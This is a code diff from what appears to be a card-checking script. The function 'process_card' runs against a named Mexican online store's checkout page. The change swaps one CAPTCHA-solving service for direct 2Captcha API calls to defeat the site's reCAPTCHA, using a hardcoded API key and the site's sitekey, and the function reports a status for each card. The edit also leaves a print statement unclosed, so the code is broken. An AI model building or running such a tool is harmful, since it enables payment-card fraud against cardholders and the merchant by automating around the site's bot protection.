@@ -215,34 +215,45 @@ async def process_card(card: str) -> str:
             URL_OBJETIVO = "https://tienda.ultracel.com.mx/paso-3"  # 🔹 Página con el reCAPTCHA
 
             api_key = "c9373bba28615938eb80b5b8a434ae8c"
-
-            # URL del sitio donde se encuentra el reCAPTCHA
             website_url = "https://tienda.ultracel.com.mx/paso-3"
-
-            # Sitekey del reCAPTCHA (obtenido del HTML del sitio)
             sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"
-
-            # Crear y configurar el solver
-            solver = recaptchaV2Proxyless()
-            solver.set_verbose(1)
-            solver.set_key(api_key)
-            solver.set_website_url(website_url)
-            solver.set_website_key(sitekey)
-
-            print("⏳ Enviando tarea a AntiCaptcha...")
-
-            # Intentar resolver el CAPTCHA
-            g_response = solver.solve_and_return_solution()
-
-            if g_response != 0:
-                print("✅ CAPTCHA resuelto correctamente.")
+            
+            # 1️⃣ Enviar tarea a 2Captcha
+            in_response = requests.post("https://2captcha.com/in.php", data={
+                "key": api_key,
+                "method": "userrecaptcha",
+                "googlekey": sitekey,
+                "pageurl": website_url,
+                "json": 1
+            }).json()
+            
+            if in_response["status"] != 1:
+                raise Exception("Error al enviar CAPTCHA:", in_response["request"])
+            
+            task_id = in_response["request"]
+            print("⏳ Tarea enviada, esperando resolución...")
+            
+            # 2️⃣ Esperar la solución
+            g_response = None
+            for i in range(30):  # hasta 30 intentos (~150s)
+                time.sleep(5)
+                res = requests.get("https://2captcha.com/res.php", params={
+                    "key": api_key,
+                    "action": "get",
+                    "id": task_id,
+                    "json": 1
+                }).json()
                 
-
-                # Puedes usar este token para enviarlo al formulario del sitio
+                if res["status"] == 1:
+                    g_response = res["request"]
+                    break
+                print("⌛ CAPTCHA aún no resuelto...")
+            
+            if g_response:
+                print("✅ CAPTCHA resuelto correctamente")
             else:
-                print(f"❌ Error al resolver CAPTCHA: {solver.error_code}")
-
-            # 2. Esperar que Anti-Captcha resuelva el captcha
+                print("❌ No se pudo resolver el CAPTCHA"
+                        # 2. Esperar que Anti-Captcha resuelva el captcha
             
 
             headers = {
@@ -429,6 +440,7 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
 
 
